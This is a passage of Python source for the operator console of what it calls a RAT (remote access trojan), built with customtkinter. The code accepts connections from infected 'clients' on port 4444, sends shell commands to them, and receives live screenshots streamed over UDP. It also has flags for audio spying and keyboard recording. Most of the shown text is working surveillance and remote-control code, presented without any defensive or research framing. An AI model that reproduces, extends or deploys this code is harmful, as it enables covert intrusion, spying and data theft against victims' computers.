        docs_btn.pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
        
        help_btn = ctk.CTkButton(help_buttons_frame, text="Instagram", 
                            command=self.open_instagram,
                            fg_color=theme["button_color"],
                            hover_color=theme["hover_color"])
        help_btn.pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
        
        check_updates_btn = ctk.CTkButton(help_buttons_frame, text="Github", 
                                        command=self.open_github,
                                        fg_color=theme["button_color"],
                                        hover_color=theme["hover_color"])
        check_updates_btn.pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
        
        # Register new components with theme manager
        if hasattr(self, 'theme_manager'):
            widgets_to_track = [
                server_settings_frame, ui_settings_frame, monitoring_frame, 
                help_frame
            ]
            
            for widget in widgets_to_track:
                self.theme_manager.track_widget(widget)

    def show_tooltip(self, title, message):
        """Show a custom tooltip with helpful information"""
        tooltip = ctk.CTkToplevel(self.root)
        tooltip.title(title)
        tooltip.geometry("400x200")
        tooltip.resizable(False, False)
        tooltip.transient(self.root)  # Stay on top of the main window
        
        # Get theme colors
        theme = self.THEMES[self.current_theme]
        
        # Create tooltip content
        frame = ctk.CTkFrame(tooltip, corner_radius=10)
        frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Title
        title_label = ctk.CTkLabel(frame, text=title, 
                                font=ctk.CTkFont(size=16, weight="bold"))
        title_label.pack(pady=(10, 5))
        
        # Help message
        message_label = ctk.CTkLabel(frame, text=message, 
                                font=ctk.CTkFont(size=12),
                                justify="left",
                                wraplength=350)
        message_label.pack(pady=10, padx=15, fill=tk.BOTH, expand=True)
        
        # Close button
        close_btn = ctk.CTkButton(frame, text="Close", 
                            command=tooltip.destroy,
                            width=80)
        close_btn.pack(pady=(0, 10))
        
        # Center the tooltip relative to the main window
        tooltip.update_idletasks()
        x = self.root.winfo_x() + (self.root.winfo_width() // 2) - (tooltip.winfo_width() // 2)
        y = self.root.winfo_y() + (self.root.winfo_height() // 2) - (tooltip.winfo_height() // 2)
        tooltip.geometry(f"+{x}+{y}")
        
        # Make the tooltip modal
        tooltip.grab_set()
        tooltip.focus_set()
        
        # Auto-close after 10 seconds
        tooltip.after(10000, tooltip.destroy)


    def update_screenshot_quality(self, value=None):
        """Update screenshot quality setting"""
        quality = self.screenshot_quality_var.get()
        self.screenshot_quality_label.configure(text=f"{quality}%")
        
        # Update the actual quality setting
        self.SCREENSHOT_QUALITY = quality

    def update_screenshot_fps(self, value=None):
        """Update screenshot FPS setting"""
        fps = self.screenshot_fps_var.get()
        self.screenshot_fps_label.configure(text=f"{fps} FPS")
        
        # Convert FPS to interval
        self.SCREENSHOT_INTERVAL = 1 / fps


    def open_anonymous(self):
        try:
            import webbrowser
            webbrowser.open("https://www.youtube.com/watch?v=NAUcHiRHMUE")  # Change to actual documentation URL
        except:
            messagebox.showinfo("Alert", "You are Being Directed to Anonymous Source")

    def open_instagram(self):
        try:
            import webbrowser
            webbrowser.open("https://www.instagram.com/apkaless")  # Change to actual documentation URL
        except:
            messagebox.showinfo("Alert", "You are Being Directed to Anonymous Source")

    def open_github(self):
        try:
            import webbrowser
            webbrowser.open("https://www.github.com/apkaless")  # Change to actual documentation URL
        except:
            messagebox.showinfo("Alert", "You are Being Directed to Anonymous Source")


    def restore_default_settings(self):
        """Restore all settings to default values"""
        # Ask for confirmation
        if not messagebox.askyesno("Restore Defaults", 
                                "Are you sure you want to restore all settings to their default values?"):
            return
        
        # Server settings
        self.default_ip_entry.delete(0, tk.END)
        self.default_ip_entry.insert(0, "127.0.0.1")
        
        self.default_port_entry.delete(0, tk.END)
        self.default_port_entry.insert(0, "4444")
        
        self.buffer_entry.delete(0, tk.END)
        self.buffer_entry.insert(0, "4096")
        
        self.timeout_entry.delete(0, tk.END)
        self.timeout_entry.insert(0, "10")
        
        self.autostart_var.set(False)
        
        # UI settings
        self.theme_var.set("Dark")
        self.change_theme("Dark")
        
        # Monitoring settings
        self.screenshot_quality_var.set(30)
        self.screenshot_quality_label.configure(text="30%")
        self.SCREENSHOT_QUALITY = 30
        
        self.screenshot_fps_var.set(10)
        self.screenshot_fps_label.configure(text="10 FPS")
        self.SCREENSHOT_INTERVAL = 0.1
        
        # Save settings checkbox
        self.autosave_var.set(True)
        
        # Log the action
        self.log("Settings restored to defaults", log_type="info")

    def save_settings(self):
        """Save all settings to a configuration file"""
        # Collect all settings
        settings = {
            # Server settings
            "ip": self.default_ip_entry.get(),
            "port": int(self.default_port_entry.get()),
            "buffer": int(self.buffer_entry.get()),
            "timeout": int(self.timeout_entry.get()),
            "auto_start_server": self.autostart_var.get(),
            # UI settings
            "theme": self.theme_var.get(),
            # Monitoring settings
            "screenshot_quality": self.screenshot_quality_var.get(),
            "screenshot_fps": self.screenshot_fps_var.get(),
            # Auto-save setting
            "autosave": self.autosave_var.get()
        }
        
        # Save to file
        try:
            with open("rat_settings.json", "w") as f:
                json.dump(settings, f, indent=4)
            
            self.log("Settings saved successfully", log_type="success")
            
            # Apply some settings immediately
            self.BUFFER = int(self.buffer_entry.get())
            self.ip = self.default_ip_entry.get()
            self.port = int(self.default_port_entry.get())
            self.address = (self.ip, self.port)
            self.CONNECTION_TIMEOUT = int(self.timeout_entry.get())
            self.SCREENSHOT_QUALITY = self.screenshot_quality_var.get()
            self.SCREENSHOT_INTERVAL = 1 / self.screenshot_fps_var.get()
            self.AUTO_START_SERVER = self.autostart_var.get()
            
        except Exception as e:
            self.log(f"Error saving settings: {e}", log_type="error")
            messagebox.showerror("Error", f"Could not save settings: {e}")

    def load_settings(self):
        """Load settings from configuration file"""
        try:
            with open("rat_settings.json", "r") as f:
                settings = json.load(f)
            
            # Apply server settings
            self.default_ip_entry.delete(0, tk.END)
            self.default_ip_entry.insert(0, settings.get("ip", "127.0.0.1"))
            
            self.default_port_entry.delete(0, tk.END)
            self.default_port_entry.insert(0, str(settings.get("port", 4444)))
            
            self.buffer_entry.delete(0, tk.END)
            self.buffer_entry.insert(0, str(settings.get("buffer", 4096)))
            
            self.timeout_entry.delete(0, tk.END)
            self.timeout_entry.insert(0, str(settings.get("timeout", 10)))
            
            self.autostart_var.set(settings.get("auto_start_server", False))
            
            # Apply UI settings
            theme_name = settings.get("theme", "Dark")
            self.theme_var.set(theme_name)
            self.change_theme(theme_name)
            
            # Apply monitoring settings
            self.screenshot_quality_var.set(settings.get("screenshot_quality", 30))
            self.screenshot_quality_label.configure(text=f"{settings.get('screenshot_quality', 30)}%")
            
            fps = settings.get("screenshot_fps", 10)
            self.screenshot_fps_var.set(fps)
            self.screenshot_fps_label.configure(text=f"{fps} FPS")
            
            # Apply auto-save setting
            self.autosave_var.set(settings.get("autosave", True))
            
            # Update internal variables
            self.BUFFER = settings.get("buffer", 4096)
            self.ip = settings.get("ip", "127.0.0.1")
            self.port = settings.get("port", 4444)
            self.address = (self.ip, self.port)
            self.CONNECTION_TIMEOUT = settings.get("timeout", 10)
            self.SCREENSHOT_QUALITY = settings.get("screenshot_quality", 30)
            self.SCREENSHOT_INTERVAL = 1 / settings.get("screenshot_fps", 10)
            self.AUTO_START_SERVER = settings.get("auto_start_server", False)
            
            self.log("Settings loaded successfully", log_type="success")
            
        except FileNotFoundError:
            self.log("No settings file found. Using defaults.", log_type="warning")
        except Exception as e:
            self.log(f"Error loading settings: {e}", log_type="error")
            messagebox.showerror("Error", f"Could not load settings: {e}")
                
    # Add auto-save hook to application exit
    def on_closing(self):
        """Handle application closing and auto-save settings if enabled"""
        if hasattr(self, 'autosave_var') and self.autosave_var.get():
            self.save_settings()
        
        # Stop server if running
        if self.is_server_running:
            self.stop_server()
        
        # Destroy the root window
        self.root.destroy()
            
    def change_theme(self, theme_name):
        """Update the theme for all components using the theme manager."""
        self.current_theme = theme_name
        
        # Apply theme via the theme manager
        self.theme_manager.apply_theme(theme_name)
        
        # Log theme change
        self.log(f"Theme changed to: {theme_name}")
    
    
    def log(self, msg, log_type="info"):
        """Enhanced logging with message type support"""
        # Update log in GUI
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        log_entry = f"[{timestamp}] {str(msg)}"
        
        self.log_text.configure(state="normal")
        
        # Use appropriate tag based on log type
        if log_type == "warning":
            self.log_text.insert(tk.END, log_entry + "\n", "warning")
            # Also add to alerts for warnings
            self.add_alert(f"Warning: {msg}")
        elif log_type == "error":
            self.log_text.insert(tk.END, log_entry + "\n", "error")
            # Also add to alerts for errors
            self.add_alert(f"Error: {msg}")
        elif log_type == "success":
            self.log_text.insert(tk.END, log_entry + "\n", "success")
        elif log_type == "client":
            self.log_text.insert(tk.END, log_entry + "\n", "client")
        else:
            self.log_text.insert(tk.END, log_entry + "\n", "info")
        
        self.log_text.see(tk.END)
        self.log_text.configure(state="disabled")
        
        # Update status bar
        self.status_bar.configure(text=str(msg))

    def start_performance_monitoring(self):
        """Start thread to monitor system performance"""
        # Cancel any existing monitoring
        if hasattr(self, 'performance_after_id'):
            self.root.after_cancel(self.performance_after_id)
        
        # Start new monitoring cycle
        self.update_performance_metrics()
        
    def update_performance_metrics(self):
        """Update performance metrics display"""
        try:
            import psutil
            
            # Update CPU usage
            cpu_percent = psutil.cpu_percent(interval=0.5)
            self.cpu_value.configure(text=f"{cpu_percent:.1f}%")
            self.cpu_progress.set(cpu_percent / 100)
            
            # Update memory usage
            memory = psutil.virtual_memory()
            memory_percent = memory.percent
            self.memory_value.configure(text=f"{memory_percent:.1f}%")
            self.memory_progress.set(memory_percent / 100)
            
            # Update network I/O
            net_io = psutil.net_io_counters()
            if hasattr(self, 'prev_net_io'):
                # Calculate bytes per second
                send_rate = (net_io.bytes_sent - self.prev_net_io.bytes_sent) / 1
                recv_rate = (net_io.bytes_recv - self.prev_net_io.bytes_recv) / 1
                total_rate = send_rate + recv_rate
                
                # Format as human-readable
                rate_str = self.format_size(total_rate) + "/s"
                self.network_value.configure(text=rate_str)
            
            # Store current network stats for next calculation
            self.prev_net_io = net_io
            
            # Update uptime if server is running
            if self.is_server_running and self.start_time is not None:
                self.update_uptime()
            
        except ImportError:
            # psutil not available, show N/A values
            self.cpu_value.configure(text="N/A")
            self.memory_value.configure(text="N/A")
            self.network_value.configure(text="N/A")
            
        except Exception as e:
            # Log error but don't stop monitoring
            print(f"Error updating performance metrics: {e}")
        
        # Schedule next update
        self.performance_after_id = self.root.after(1000, self.update_performance_metrics)

    def update_uptime(self):
        """Update the uptime display"""
        if self.start_time is not None:
            current_time = time.time()
            uptime_seconds = int(current_time - self.start_time)
            
            # Format as HH:MM:SS
            hours, remainder = divmod(uptime_seconds, 3600)
            minutes, seconds = divmod(remainder, 60)
            uptime_str = f"{hours:02}:{minutes:02}:{seconds:02}"
            
            self.uptime_value.configure(text=uptime_str)
            
    # Server operations
    def start_server_gui(self):
        # Get IP and port from inputs
        try:
            self.ip = self.ip_entry.get()
            self.port = int(self.port_entry.get())
            self.address = (self.ip, self.port)
            
            threading.Thread(target=self.start_server, daemon=True).start()

            self.start_server_btn.configure(state="disabled")
            self.stop_server_btn.configure(state="normal")
            
        except ValueError:
            messagebox.showerror("Error", "Port must be a valid number")
        except Exception as e:
            messagebox.showerror("Error", f"Could not start server: {e}")
    
    def start_server(self):
        """Enhanced version of start_server with uptime tracking"""
        if not self.is_server_running:
            try:
                self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.server_socket.bind(self.address)
                self.server_socket.listen()
                self.is_server_running = True
                
                # Start uptime tracking
                self.start_time = time.time()
                
                # Update UI
                self.server_status_value.configure(text="Online", text_color=self.THEMES[self.current_theme]["success_color"])
                self.server_address_value.configure(text=f"{self.address[0]}:{self.address[1]}")
                self.log(f"Server is now running on {self.address[0]}:{self.address[1]}", log_type="success")
                self.add_alert("Server started successfully")
                
                threading.Thread(target=self.accept_clients, daemon=True).start()
                
            except (ConnectionError, ConnectionResetError, ConnectionRefusedError) as err:
                self.log(f"Connection Error: {err}", log_type="error")
                self.is_server_running = False
                self.stop_server()
                messagebox.showerror("Connection Error", str(err))
        else:
            self.log("Server Already Running", log_type="warning")
    
    
    def stop_server(self):
        """Enhanced version of stop_server with uptime reset"""
        try:
            if self.is_server_running:
                self.is_server_running = False
                self.receive_screenshot_trigger = False
                self.audiospy_trigger = False
                self.keyboard_recording_trigger = False
                
                # Reset uptime tracking
                self.start_time = None
                self.uptime_value.configure(text="00:00:00")
                
                # Close all client connections
                self.disconnect_all()
                
                # Close server socket
                if self.server_socket:
                    self.server_socket.close()
                    self.server_socket = None
                
                # Update UI
                self.server_status_value.configure(text="Offline", text_color=self.THEMES[self.current_theme]["danger_color"])
                self.start_server_btn.configure(state="normal")
                self.stop_server_btn.configure(state="disabled")
                self.log("Server has been stopped", log_type="warning")
                self.add_alert("Server stopped")
            else:
                self.log("Server isn't running", log_type="warning")
        except Exception as e:
            if self.server_socket:
                self.server_socket.close()
                self.server_socket = None
            self.log(f"Server has been stopped due to an error: {e}", log_type="error")


    def add_alert(self, message):
        """Add a new alert to the alerts box"""
        timestamp = time.strftime("%H:%M:%S", time.localtime())
        alert_text = f"[{timestamp}] {message}"
        
        # Add new alert at the top
        self.alerts_box.insert(0, alert_text)
        
        # Keep only the 5 most recent alerts
        if self.alerts_box.size() > 5:
            self.alerts_box.delete(5, tk.END)
 
    def quick_command_shell(self):
        """Quick access to command shell for selected client"""
        # Check if a client is selected
        if not self.current_client_socket:
            # Try to select the first available client
            if len(self.clients) > 0:
                first_client = list(self.clients.items())[0]
                addr, (client_id, conn) = first_client
                self.current_client_socket = conn
                self.connected_client_label.configure(text=f"{addr[0]}:{addr[1]}")
                self.log(f"Auto-selected client {client_id} at {addr[0]}:{addr[1]}", log_type="info")
            else:
                messagebox.showinfo("No Clients", "No clients are connected. Please connect to a client first.")
                self.notebook.select(1)  # Switch to Clients tab
                return
        
        # Switch to Command Shell tab
        self.notebook.select(3)  # Command Shell tab index
        
        # Focus the command input
        if hasattr(self, 'command_input'):
            self.root.after(100, lambda: self.command_input.focus_set())
        
        # Update connection status
        self.update_connection_status(True)
        
        # Add welcome message to terminal if it exists
        if hasattr(self, 'terminal_output'):
            try:
                hostname = self.getHostName(self.current_client_socket)
                
                self.terminal_output.configure(state="normal")
                self.terminal_output.insert(tk.END, f"\nConnected to {hostname}\n", "system")
                self.terminal_output.insert(tk.END, "Ready for commands. Type 'help' for a list of common commands.\n\n", "system")
                self.terminal_output.see(tk.END)
                self.terminal_output.configure(state="disabled")
            except:
                pass

                
    def quick_screen_capture(self):
        """Quick access to screen capture for selected client"""
        # Check if a client is selected
        if not self.current_client_socket:
            # Try to select the first available client
            if len(self.clients) > 0:
                first_client = list(self.clients.items())[0]
                addr, (client_id, conn) = first_client
                self.current_client_socket = conn
                self.connected_client_label.configure(text=f"{addr[0]}:{addr[1]}")
                self.log(f"Auto-selected client {client_id} at {addr[0]}:{addr[1]}", log_type="info")
            else:
                messagebox.showinfo("No Clients", "No clients are connected. Please connect to a client first.")
                self.notebook.select(1)  # Switch to Clients tab
                return
        
        # Switch to Monitoring tab
        self.notebook.select(4)  # Monitoring tab index
        
        # Start screen capture if not already active
        if not self.receive_screenshot_trigger:
            # Delay slightly to allow tab switch to complete
            self.root.after(100, self.start_screen_capture)
        else:
            # If already running, just show a message
            self.log("Screen capture is already active", log_type="info")
            
    
    def accept_clients(self):
        """Enhanced client acceptance with better logging and alerts"""
        while self.is_server_running:
            try:
                conn, addr = self.server_socket.accept()
                self.log(f"Client connected: {addr[0]}:{addr[1]}", log_type="client")
                
                self.clients[(addr[0], addr[1])] = (self.client_counter, conn)
                self.client_counter += 1
                
                self.clients_value.configure(text=str(len(self.clients)))
                
                try:
                    hostname = self.getHostName(conn)
                    self.add_alert(f"New client: {hostname} ({addr[0]})")
                except:
                    hostname = "Unknown"
                    self.add_alert(f"New client from {addr[0]}")
                    
                self.clients_tree.insert("", "end", values=(self.client_counter - 1, addr[0], addr[1], hostname, "Connected"))
                
            except OSError:
                break
            except Exception as e:
                self.log(f"Error accepting client: {e}", log_type="error")
    

    # Client operations
    def refresh_clients(self):
        # Clear treeview
        for item in self.clients_tree.get_children():
            self.clients_tree.delete(item)
        
        # Re-add clients
        for addr, (client_id, conn) in self.clients.items():
            try:
                hostname = self.getHostName(conn)
            except:
                hostname = "Unknown"
                
            self.clients_tree.insert("", "end", values=(client_id, addr[0], addr[1], hostname, "Connected"))
        
        self.clients_value.configure(text=str(len(self.clients)))
        self.log("Clients list refreshed")
    
    def connect_to_client(self):
        """Enhanced version to connect to a client with additional info"""
        # Get selected client
        selection = self.clients_tree.selection()
        if not selection:
            messagebox.showinfo("No Selection", "Please select a client to connect")
            return
        
        selected_id = self.clients_tree.item(selection[0])["values"][0]
        
        # Find the client socket
        for addr, (client_id, conn) in self.clients.items():
            if client_id == selected_id:
                self.current_client_socket = conn
                self.connected_client_label.configure(text=f"{addr[0]}:{addr[1]}")
                
                # Update file transfer client info
                if hasattr(self, 'file_transfer'):
                    self.file_transfer.update_client_info()
                
                # Update process manager client info
                if hasattr(self, 'process_manager'):
                    self.process_manager.update_client_info()
                
                # Update advanced monitoring client info
                if hasattr(self, 'advanced_monitoring'):
                    self.advanced_monitoring.update_client_info()
                    
                if hasattr(self, 'remote_desktop'):
                    self.remote_desktop.update_client_info()
                    
                # Switch to command tab
                self.notebook.select(2)  # Command Shell tab
                
                try:
                    # Update connection status
                    self.update_connection_status(True)
                    
                    # Get hostname and OS info
                    hostname = self.getHostName(conn)
                    
                    # Get OS information
                    try:
                        if self.terminal_mode.get() == "bash":
                            os_info_cmd = "uname -s -r"
                        else:
                            os_info_cmd = "wmic os get Caption,Version /value"
                            
                        os_result, _ = self.send_cmd(conn, os_info_cmd)
                        os_info = os_result.decode().strip()
                        
                        # Parse OS info for display
                        if "Windows" in os_info:
                            # Extract from Windows format
                            caption_match = re.search(r'Caption=([^\r\n]+)', os_info)
                            version_match = re.search(r'Version=([^\r\n]+)', os_info)
                            
                            os_name = caption_match.group(1) if caption_match else "Windows"
                            os_version = version_match.group(1) if version_match else ""
                            
                            self.client_os_label.configure(text=f"OS: {os_name} {os_version}")
                        else:
                            # Unix/Linux format
                            self.client_os_label.configure(text=f"OS: {os_info}")
                    except:
                        self.client_os_label.configure(text="")
                    
                    self.log(f"Connected to client: {hostname} ({addr[0]}:{addr[1]})")
                    
                    # Clear terminal and show welcome message
                    self.terminal_output.configure(state="normal")
                    self.terminal_output.delete(1.0, tk.END)
                    self.terminal_output.insert(tk.END, f"Connected to {hostname} ({addr[0]}:{addr[1]})\n", "system")
                    
                    # Add OS info if available
                    if self.client_os_label.cget("text"):
                        self.terminal_output.insert(tk.END, f"{self.client_os_label.cget('text')}\n", "system")
                    
                    # Add instructions and set the appropriate prompt
                    self.terminal_output.insert(tk.END, 
                        "Type commands and press Enter to execute. Use Up/Down arrows for history.\n", "system")
                    self.terminal_output.insert(tk.END, 
                        "Common commands: systeminfo, ipconfig, tasklist, dir, net user\n\n", "system")
                    
                    # Set the appropriate mode based on OS detection
                    if "Windows" in os_info:
                        self.terminal_mode.set("cmd")
                        self.prompt_label.configure(text="cmd>")
                    elif "Linux" in os_info or "Unix" in os_info:
                        self.terminal_mode.set("bash")
                        self.prompt_label.configure(text="bash$")
                    
                    self.terminal_output.configure(state="disabled")
                    
                    # Update cmd_status_bar
                    self.cmd_status_bar.configure(text=f"Connected to {hostname}")
                    
                except Exception as e:
                    self.log(f"Error connecting to client: {e}")
                    self.terminal_output.configure(state="normal")
                    self.terminal_output.insert(tk.END, f"Error connecting: {e}\n", "error")
                    self.terminal_output.configure(state="disabled")
                    self.update_connection_status(False)
                
                # Focus the command input
                self.command_input.focus_set()
                return
        
        messagebox.showerror("Error", "Could not find selected client")
    
    def disconnect_client(self):
        # Get selected client
        selection = self.clients_tree.selection()
        if not selection:
            messagebox.showinfo("No Selection", "Please select a client to disconnect")
            return
        
        selected_id = self.clients_tree.item(selection[0])["values"][0]
        
        # Find and remove the client
        client_addr = None
        for addr, (client_id, conn) in list(self.clients.items()):
            if client_id == selected_id:
                client_addr = addr
                try:
                    conn.close()
                except:
                    pass
                
                del self.clients[addr]
                
                # Update UI
                self.clients_tree.delete(selection[0])
                self.clients_value.configure(text=str(len(self.clients)))
                
                # Reset current client if it was the one disconnected
                if self.current_client_socket == conn:
                    self.current_client_socket = None
                    self.connected_client_label.configure(text="None")
                    
                    # Update file transfer UI
                    if hasattr(self, 'file_transfer'):
                        self.file_transfer.update_client_info()
                    
                    # Update process manager UI
                    if hasattr(self, 'process_manager'):
                        self.process_manager.update_client_info()
                    
                    # Update advanced monitoring UI
                    if hasattr(self, 'advanced_monitoring'):
                        self.advanced_monitoring.update_client_info()
                
                    if hasattr(self, 'remote_desktop') and self.remote_desktop.is_controlling:
                        self.remote_desktop.stop_remote_control()
                self.log(f"Client disconnected: {addr[0]}:{addr[1]}")
                break
        
        if not client_addr:
            messagebox.showerror("Error", "Could not find selected client")
            
    # Update the disconnect_all method to include the process manager:
    def disconnect_all(self):
    # Close all client connections
        for addr, (_, conn) in list(self.clients.items()):
            try:
                conn.close()
            except:
                pass
        
        # Clear clients dictionary and update UI
        self.clients.clear()
        self.current_client_socket = None
        self.connected_client_label.configure(text="None")
        
        # Update file transfer UI
        if hasattr(self, 'file_transfer'):
            self.file_transfer.update_client_info()
        
        # Update process manager UI
        if hasattr(self, 'process_manager'):
            self.process_manager.update_client_info()
        
        # Update advanced monitoring UI
        if hasattr(self, 'advanced_monitoring'):
            self.advanced_monitoring.update_client_info()
        if hasattr(self, 'remote_desktop') and self.remote_desktop.is_controlling:
            self.remote_desktop.stop_remote_control()
        # Clear treeview
        for item in self.clients_tree.get_children():
            self.clients_tree.delete(item)
        
        self.clients_value.configure(text="0")
        self.log("All clients disconnected")

    
    def show_client_menu(self, event):
        # Show context menu on right-click
        if self.clients_tree.selection():
            self.client_menu.post(event.x_root, event.y_root)
    
    def view_client_details(self):
        # Get selected client
        selection = self.clients_tree.selection()
        if not selection:
            return
        
        selected_values = self.clients_tree.item(selection[0])["values"]
        
        # Create details dialog
        details_window = ctk.CTkToplevel(self.root)
        details_window.title("Client Details")
        details_window.geometry("400x300")
        details_window.resizable(False, False)
        
        # Add client details
        frame = ctk.CTkFrame(details_window)
        frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        title = ctk.CTkLabel(frame, text="Client Information", font=ctk.CTkFont(size=16, weight="bold"))
        title.pack(pady=10)
        
        # Client ID
        id_frame = ctk.CTkFrame(frame)
        id_frame.pack(fill=tk.X, pady=5)
        
        id_label = ctk.CTkLabel(id_frame, text="Client ID:", width=100)
        id_label.pack(side=tk.LEFT, padx=5)
        
        id_value = ctk.CTkLabel(id_frame, text=str(selected_values[0]))
        id_value.pack(side=tk.LEFT, padx=5)
        
        # IP Address
        ip_frame = ctk.CTkFrame(frame)
        ip_frame.pack(fill=tk.X, pady=5)
        
        ip_label = ctk.CTkLabel(ip_frame, text="IP Address:", width=100)
        ip_label.pack(side=tk.LEFT, padx=5)
        
        ip_value = ctk.CTkLabel(ip_frame, text=selected_values[1])
        ip_value.pack(side=tk.LEFT, padx=5)
        
        # Port
        port_frame = ctk.CTkFrame(frame)
        port_frame.pack(fill=tk.X, pady=5)
        
        port_label = ctk.CTkLabel(port_frame, text="Port:", width=100)
        port_label.pack(side=tk.LEFT, padx=5)
        
        port_value = ctk.CTkLabel(port_frame, text=str(selected_values[2]))
        port_value.pack(side=tk.LEFT, padx=5)
        
        # Hostname
        hostname_frame = ctk.CTkFrame(frame)
        hostname_frame.pack(fill=tk.X, pady=5)
        
        hostname_label = ctk.CTkLabel(hostname_frame, text="Hostname:", width=100)
        hostname_label.pack(side=tk.LEFT, padx=5)
        
        hostname_value = ctk.CTkLabel(hostname_frame, text=selected_values[3])
        hostname_value.pack(side=tk.LEFT, padx=5)
        
        # Actions
        actions_frame = ctk.CTkFrame(frame)
        actions_frame.pack(fill=tk.X, pady=10)
        
        connect_btn = ctk.CTkButton(actions_frame, text="Connect", 
                                   command=lambda: [details_window.destroy(), self.connect_to_client()])
        connect_btn.pack(side=tk.LEFT, padx=5)
        
        disconnect_btn = ctk.CTkButton(actions_frame, text="Disconnect", 
                                      command=lambda: [details_window.destroy(), self.disconnect_client()])
        disconnect_btn.pack(side=tk.LEFT, padx=5)
        
        close_btn = ctk.CTkButton(actions_frame, text="Close", command=details_window.destroy)
        close_btn.pack(side=tk.RIGHT, padx=5)
    
    # Command functions
    def send_command(self, event):
        if not self.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
        
        command = self.command_input.get()
        if not command:
            return
        
        try:
            # Display command in terminal
            self.terminal_output.configure(state="normal")
            self.terminal_output.insert(tk.END, f"> {command}\n")
            
            # Send command to client
            result, size = self.send_cmd(self.current_client_socket, command)
            
            # Display result
            self.terminal_output.insert(tk.END, f"{result.decode()}\n\n")
            self.terminal_output.see(tk.END)
            self.terminal_output.configure(state="disabled")
            
            # Clear command input
            self.command_input.delete(0, tk.END)
            
        except Exception as e:
            self.log(f"Error sending command: {e}")
            
            self.terminal_output.configure(state="normal")
            self.terminal_output.insert(tk.END, f"Error: {e}\n\n")
            self.terminal_output.see(tk.END)
            self.terminal_output.configure(state="disabled")
    
    # Monitoring functions
    def start_screen_capture(self):
        if not self.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
        
        self.receive_screenshot_trigger = True
        threading.Thread(target=self.receive_screenshot_thread, daemon=True).start()
        
        # Update UI
        self.start_screen_btn.configure(state="disabled")
        self.stop_screen_btn.configure(state="normal")
        self.log("Started screen capture")
    
    def receive_screenshot_thread(self):
        """Receive and display screenshots from client with improved reliability"""
        try:
            # Create and configure UDP socket
            udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # Increase receive buffer for high throughput
            udps.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 8388608)  # 8MB buffer
            
            # Set timeout to prevent blocking indefinitely
            udps.settimeout(0.5)
            
            # Bind to the listening address
            udps.bind(self.address)
            
            # Signal the client to start sending screenshots
            self.current_client_socket.send(b'SCRSHOOT')
            
            # Initialize frame processing variables
            current_frame = {}  # Dictionary to hold chunks for current frame
            expected_frames = {}  # Track metadata for expected frames
            last_complete_frame = None  # Store last complete frame data
            last_frame_number = 0  # Track frame sequence
            
            self.log("Screenshot receiver started")
            
            while self.receive_screenshot_trigger:
                try:
                    # Receive packet from client
                    packet, _ = udps.recvfrom(65536)  # Large buffer for any packet size
                    
                    # Check if this is a metadata packet (first 16 bytes, no chunk index)
                    if len(packet) >= 16:
                        # Check if this could be a metadata packet
                        try:
                            # Unpack metadata (total_size, total_chunks, frame_number)
                            data_len, num_chunks, frame_number = struct.unpack('!QII', packet[:16])
                            
                            # If this is termination signal (all zeros), exit loop
                            if data_len == 0 and num_chunks == 0 and frame_number == 0:
                                self.log("Received termination signal from client")
                                break
                                
                            # If this is a metadata packet (no additional data)
                            if len(packet) == 16:
                                # Store expected frame information
                                expected_frames[frame_number] = {
                                    'total_size': data_len,
                                    'total_chunks': num_chunks,
                                    'received_chunks': 0,
                                    'start_time': time.time(),
                                    'chunks': {}
                                }
                                
                                # Initialize storage for this frame
                                current_frame[frame_number] = {}
                                
                                # Clean up old incomplete frames (older than current - 2)
                                for old_frame in list(current_frame.keys()):
                                    if old_frame < frame_number - 2:
                                        del current_frame[old_frame]
                                
                                for old_frame in list(expected_frames.keys()):
                                    if old_frame < frame_number - 2:
                                        del expected_frames[old_frame]
                                
                                continue
                        except struct.error:
                            # Not a metadata packet, must be a chunk
                            pass
                    
                    # Handle data chunk (header + payload)
                    if len(packet) > 12:  # At least header size
                        try:
                            # Unpack chunk header (frame_number, chunk_index, total_chunks)
                            frame_number, chunk_index, total_chunks = struct.unpack('!III', packet[:12])
                            
                            # Extract chunk data
                            chunk_data = packet[12:]
                            
                            # Store chunk in frame dictionary
                            if frame_number in current_frame:
                                current_frame[frame_number][chunk_index] = chunk_data
                                
                                # Update received chunks count
                                if frame_number in expected_frames:
                                    expected_frames[frame_number]['received_chunks'] += 1
                            
                            # Check if we have all chunks for this frame
                            if (frame_number in current_frame and 
                                frame_number in expected_frames and
                                len(current_frame[frame_number]) == expected_frames[frame_number]['total_chunks']):
                                
                                # All chunks received, reassemble frame
                                frame_data = bytearray()
                                for i in range(expected_frames[frame_number]['total_chunks']):
                                    if i in current_frame[frame_number]:
                                        frame_data.extend(current_frame[frame_number][i])
                                    else:
                                        # Missing chunk, can't complete frame
                                        self.log(f"Missing chunk {i} in frame {frame_number}")
                                        break
                                
                                # If we have complete data matching expected size
                                if len(frame_data) == expected_frames[frame_number]['total_size']:
                                    # Process the complete frame
                                    self._process_frame_data(bytes(frame_data), frame_number)
                                    
                                    # Update last complete frame number
                                    last_frame_number = frame_number
                                    
                                    # Clean up this frame data
                                    del current_frame[frame_number]
                                    del expected_frames[frame_number]
                                
                        except struct.error as se:
                            self.log(f"Error unpacking chunk header: {se}")
                            continue
                    
                    # Check for timeouts on frames (abandon frames older than 2 seconds)
                    current_time = time.time()
                    for frame_num in list(expected_frames.keys()):
                        frame_age = current_time - expected_frames[frame_num]['start_time']
                        if frame_age > 2.0:
                            # Log incomplete frame stats
                            received = expected_frames[frame_num]['received_chunks']
                            total = expected_frames[frame_num]['total_chunks']
                            self.log(f"Abandoning incomplete frame {frame_num}: {received}/{total} chunks after {frame_age:.1f}s")
                            
                            # Clean up
                            if frame_num in current_frame:
                                del current_frame[frame_num]
                            del expected_frames[frame_num]
                    
                except socket.timeout:
                    # This is expected with the non-blocking socket
                    continue
                    
                except Exception as e:
                    if not self.receive_screenshot_trigger:
                        break
                        
                    self.log(f"Screenshot Receive Error: {e}")
                    continue
            
            # Cleanup
            udps.close()
